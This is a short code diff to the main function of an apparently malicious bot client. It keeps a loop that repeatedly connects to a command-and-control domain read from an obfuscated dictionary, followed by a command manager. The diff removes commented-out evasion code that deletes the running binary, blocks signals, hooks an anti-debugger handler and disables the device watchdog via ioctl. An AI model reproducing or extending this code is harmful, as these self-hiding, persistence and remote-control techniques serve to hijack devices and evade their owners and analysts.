@@ -23,33 +23,6 @@ int main(int argc, char **argv) {
     
     dict_init();
 
-//#ifndef DEBUG
-//    sigset_t sigs;
-//    int wfd;
-//
-//    // Delete self
-//    unlink(argv[0]);
-//
-//    // Signal based control flow
-//    sigemptyset(&sigs);
-//    sigaddset(&sigs, SIGINT);
-//    sigprocmask(SIG_BLOCK, &sigs, NULL);
-//    signal(SIGCHLD, SIG_IGN);
-//    //signal(SIGTRAP, &anti_gdb_entry);
-//
-//    // Prevent watchdog from rebooting device
-//    if ((wfd = open("/dev/watchdog", 2)) != -1 ||
-//        (wfd = open("/dev/misc/watchdog", 2)) != -1)
-//    {
-//        int one = 1;
-//
-//        ioctl(wfd, 0x80045704, &one);
-//        close(wfd);
-//        wfd = 0;
-//    }
-//    chdir("/");
-//#endif
-
     //polling
     while(1) {
         if (connection_init(&client_fd, &server_address, dict_get(DICT_DOMAIN_NAME)) < 0) {
@@ -70,7 +43,6 @@ int main(int argc, char **argv) {
         }
 
         //command manager
-        
        
         
 #ifdef DEBUG
